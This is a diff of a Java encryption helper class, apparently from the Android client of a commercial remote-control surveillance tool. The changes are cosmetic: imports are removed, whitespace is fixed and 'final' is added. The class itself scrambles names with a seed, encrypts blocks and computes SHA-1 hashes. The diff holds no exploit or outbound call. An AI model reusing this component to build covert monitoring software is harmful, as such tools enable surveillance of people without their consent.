@@ -11,10 +11,7 @@ package com.ht.RCSAndroidGUI.crypto;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 
-import javax.crypto.Cipher;
 import javax.crypto.NoSuchPaddingException;
-
-import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.utils.Check;
@@ -38,7 +35,7 @@ public class Encryption {
 	 * Inits the.
 	 */
 	public static void init() {
-	
+
 	}
 
 	/**
@@ -66,7 +63,7 @@ public class Encryption {
 	 * @return the string
 	 */
 	public static String encryptName(final String Name, final int seed) {
-		//Log.d(TAG, "seed : " + seed);
+		// Log.d(TAG, "seed : " + seed);
 		return scramble(Name, seed, true);
 	}
 
@@ -176,10 +173,10 @@ public class Encryption {
 	public void makeKey(final byte[] key) {
 		try {
 			crypto = new Crypto(key);
-		} catch (NoSuchAlgorithmException e) {
+		} catch (final NoSuchAlgorithmException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
-		} catch (NoSuchPaddingException e) {
+		} catch (final NoSuchPaddingException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -255,9 +252,9 @@ public class Encryption {
 				// #ifdef DEBUG
 				debug.trace("lastBlockLen: " + lastBlockLen);
 				// #endif
-				System.arraycopy( pt, 0,plain, i * 16, lastBlockLen);
+				System.arraycopy(pt, 0, plain, i * 16, lastBlockLen);
 			} else {
-				System.arraycopy( pt, 0,plain, i * 16, 16);
+				System.arraycopy(pt, 0, plain, i * 16, 16);
 				// copyblock(plain, i, pt, 0);
 			}
 		}
@@ -312,9 +309,9 @@ public class Encryption {
 				ct = crypto.encrypt(pt);
 				Check.asserts(ct.length == 16, "Wrong size");
 
-				System.arraycopy( ct, 0,crypted, i * 16, 16);
+				System.arraycopy(ct, 0, crypted, i * 16, 16);
 				iv = Utils.copy(ct);
-			} catch (Exception e) {
+			} catch (final Exception e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
@@ -342,7 +339,7 @@ public class Encryption {
 			digest = MessageDigest.getInstance("SHA-1");
 			digest.update(message, offset, length);
 			final byte[] sha1 = digest.digest();
-	
+
 			return sha1;
 		} catch (final NoSuchAlgorithmException e) {
 			// TODO Auto-generated catch block
@@ -401,7 +398,7 @@ public class Encryption {
 					padplain[clen - i] = (byte) value;
 				}
 			}
-			System.arraycopy( plain, offset,padplain, 0, len);
+			System.arraycopy(plain, offset, padplain, 0, len);
 			return padplain;
 		} else {
 			return plain;
